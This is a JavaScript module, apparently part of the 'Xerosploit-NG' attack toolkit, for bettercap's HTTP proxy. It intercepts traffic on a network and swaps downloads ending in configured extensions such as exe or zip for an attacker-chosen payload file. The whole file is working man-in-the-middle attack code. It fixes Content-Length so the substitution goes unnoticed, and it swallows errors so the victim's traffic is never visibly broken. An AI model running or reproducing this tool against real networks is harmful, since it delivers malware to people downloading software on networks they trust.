// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- ReplaceFile
//
// Replaces the body of downloads whose path extension matches one of the
// generated global XE_EXTENSIONS with the file referenced by XE_TARGET_FILE.
//
// Ported from the bettercap v1 Ruby proxy module:
//   modules/replace_file.rb   (GPLv3)
//     if request.path.include?(".#{@@extension}")
//       response['Content-Length'] = @@payload.bytesize
//       response.body = @@payload
//     end
// Backs the "Replace Download" menu entry of Xerosploit.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_EXTENSIONS  JS array of extensions to match, e.g. ["exe","zip"]
//   XE_TARGET_FILE absolute path of the replacement payload.
//
// Handlers: onResponse(req, res) -- v1 matched on the request but rewrote the
// response body; bettercap v2 exposes the mutable body only in onResponse,
// where req.Path still carries the request path.
//
// Strict passthrough: any request whose path does not match is left untouched,
// and any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "replace_file";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

// Normalise XE_EXTENSIONS into a lowercase, dot-stripped array of extensions.
function xeNormalizeExtensions() {
    var raw = (typeof XE_EXTENSIONS === "undefined") ? null : XE_EXTENSIONS;
    var out = [];
    var i, e;
    if (raw === null || raw === undefined) { return out; }
    if (typeof raw === "string") { raw = [raw]; }
    if (typeof raw.length !== "number") { return out; }
    for (i = 0; i < raw.length; i++) {
        e = ("" + raw[i]).toLowerCase().replace(/^\./, "");
        if (e.length > 0) { out.push(e); }
    }
    return out;
}

// Faithful to v1: request.path.include?(".ext") (query/fragment stripped first).
function xeMatchesExtension(path, exts) {
    if (!path) { return false; }
    var p = ("" + path).toLowerCase().split("?")[0].split("#")[0];
    for (var i = 0; i < exts.length; i++) {
        if (p.indexOf("." + exts[i]) !== -1) { return true; }
    }
    return false;
}

function onLoad() {
    var exts = xeNormalizeExtensions();
    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    xeLog("loaded (extensions=[" + exts.join(", ") + "], target file=" + target + ")");
}

function onResponse(req, res) {
    try {
        var exts = xeNormalizeExtensions();
        if (exts.length === 0) { xeWarn("XE_EXTENSIONS is not set; passing through"); return; }

        var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
        if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }

        var path = (req && req.Path) ? req.Path : (req && req.URL ? req.URL : "");
        if (!xeMatchesExtension(path, exts)) { return; }                // strict passthrough

        var payload = xeReadFile(target);
        if (payload === null || payload === "") { xeWarn("empty replacement file: " + target); return; }

        xeLog("replacing " + path + " with " + target);
        xeSetBody(res, payload);
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
